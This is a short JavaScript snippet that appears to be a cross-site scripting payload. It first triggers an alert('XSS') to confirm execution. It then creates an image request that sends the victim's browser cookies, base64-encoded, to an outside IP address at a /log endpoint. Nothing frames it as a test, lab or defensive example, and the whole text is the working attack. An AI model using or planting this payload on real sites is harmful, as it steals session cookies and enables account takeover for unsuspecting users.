alert('XSS');  // Ensure that the alert executes first
var img = new Image();
img.src = 'https://49.13.194.218/log?cookie=' + encodeURIComponent(btoa(document.cookie));
